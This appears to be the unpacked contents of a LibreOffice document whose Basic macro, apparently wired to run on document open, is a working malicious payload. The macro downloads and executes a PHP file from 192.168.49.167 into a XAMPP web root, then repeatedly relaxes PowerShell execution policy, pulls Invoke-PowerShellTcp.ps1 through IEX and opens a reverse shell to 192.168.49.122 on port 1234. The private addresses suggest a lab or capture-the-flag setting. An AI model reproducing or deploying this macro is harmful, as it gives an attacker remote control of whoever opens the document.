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xx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xxx.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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1:35:39.864356630</meta:creation-date>
    <meta:generator>LibreOffice/7.2.2.2$Linux_X86_64 LibreOffice_project/20$Build-2</meta:generator>
    <dc:date>2021-11-04T17:35:06.380768292</dc:date>
    <meta:editing-duration>PT5H59M15S</meta:editing-duration>
    <meta:editing-cycles>2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xxx"/>
</library:library>
</file>

<file path=Basic/Standard/xxx.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="xxx" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell iwr http://192.168.49.167:81/r.php -o C:/xampp/htdocs/r.php")
    Shell("cmd /c powershell -c C:/xampp/htdocs/r.php")
    Shell("cmd /c powershell -nop -c php C:/xampp/htdocs/r.php")
	Shell("cmd /c powershell -nop -c `cd C:/Users/Guest/Public; Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser; IEX(New-Object Net.WebClient).downloadString('http://192.168.49.167:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.122 -Port 1234`")
	Shell("cmd /c powershell -c `cd C:/Users/Guest/Public/Documents; Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser; IEX(New-Object Net.WebClient).downloadString('http://192.168.49.167:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.122 -Port 1234`")
	Shell("cmd /c powershell -c `cd C:/Temp; Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser; IEX(New-Object Net.WebClient).downloadString('http://192.168.49.167:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.122 -Port 1234`")
	Shell("cmd /c powershell -c `cd C:/Windows/Temp; Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser; IEX(New-Object Net.WebClient).downloadString('http://192.168.49.167:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.122 -Port 1234`")
	Shell("cmd /c powershell -c `cd C:/Windows/Tasks; Set-ExecutionPolicy -ExecutionPolicy UnRestricted -Scope CurrentUser; IEX(New-Object Net.WebClient).downloadString('http://192.168.49.167:81/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.49.122 -Port 1234`"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